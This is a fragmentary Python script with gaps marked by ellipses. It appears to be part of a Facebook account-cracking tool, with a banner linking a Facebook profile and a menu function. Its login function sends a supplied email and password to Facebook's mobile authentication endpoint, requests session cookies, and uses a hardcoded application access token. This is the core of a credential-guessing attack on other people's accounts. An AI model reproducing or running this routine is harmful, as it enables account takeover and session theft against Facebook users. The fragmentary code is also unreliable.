...
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikrirampan305
\x1b[1;94m────────────────────────────────────────────────────""")
...
def moch_yayan():
    ...
    if yayan == "1" or yayan =="01":
         ...
         def login(username,password,cek=False):
             ...
             api = 'https://b-api.facebook.com/method/auth.login?format=json&email='+str(username)+'&password='+str(password)+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
